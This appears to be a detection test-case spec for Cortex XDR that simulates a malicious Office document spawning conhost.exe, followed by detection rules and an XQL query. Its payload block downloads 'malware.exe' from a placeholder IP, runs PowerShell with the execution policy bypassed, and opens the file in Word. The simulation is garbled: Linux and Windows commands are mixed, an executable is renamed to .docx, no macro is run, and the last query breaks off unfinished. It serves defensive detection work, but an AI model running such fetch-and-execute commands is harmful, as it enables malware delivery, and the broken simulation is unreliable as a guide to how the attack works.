identity.name: Office Process Spawning Conhost via Macro Execution
identity.summary: An attacker uses a malicious Office document to execute a PowerShell macro that spawns conhost.exe to load a payload. Cortex should detect the Office process initiating conhost.exe execution.
identity.description: An attacker uses a malicious Office document to execute a PowerShell macro that spawns conhost.exe to load a payload. Cortex should detect the Office process initiating conhost.exe execution.

payload.code:
cd /tmp
wget http://192.0.2.10/malware.exe -O malicious.docx
powershell.exe -ExecutionPolicy Bypass -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Hello');"
start-process -FilePath 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE' -ArgumentList 'malicious.docx'

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Microsoft Office spawns conhost
biocs.description: Detection of WINWORD.exe or EXCEL.exe spawning conhost.exe
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'WINWORD.EXE' or actor_process_image_name = 'EXCEL.EXE'
| filter action_process_image_name = 'conhost.exe'

abiocs.name: Office Macro Execution with Conhost
abiocs.description: Behavioral deviation where Office application spawns conhost.exe after macro execution
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'WINWORD.EXE' or actor_process_image_name = 'EXCEL.EXE'
| filter action_process_image_name = 'conhost.exe'
| filter causality_actor_process_image_name = 'wscript.exe' or causality_actor_process_image_name = 'powershell.exe'

xql_queries.name: Detect Office Spawn Conhost
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
